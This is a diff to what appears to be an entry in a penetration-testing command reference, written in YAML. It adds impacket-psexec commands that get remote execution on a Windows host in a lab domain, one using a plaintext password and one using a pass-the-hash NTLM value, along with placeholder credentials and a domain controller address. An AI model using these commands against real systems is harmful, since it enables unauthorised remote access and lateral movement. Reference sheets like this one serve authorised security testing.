@@ -8,11 +8,21 @@ description: |
 
   	Domain: test.local
 
+  	Domain controller: 10.10.10.111  
+
   	Username: john
 
   	Password: password123
+    
+  	--hashes: ":31d6cfe0d16ae931b73c59d7e0c089c0" (for pass the hash)
+
 command: |
-  python3 psexec.py test.local/john:password123@10.10.10.1
+  impacket-psexec test.local/john:password123@10.10.10.1 -dc-ip 10.10.10.111
+
+code: |
+  impacket-psexec test.local/john@10.10.10.1 -hashes ":31d6cfe0d16ae931b73c59d7e0c089c0" -dc-ip 10.10.10.111
+
+
 items:
   - Password
   - Username
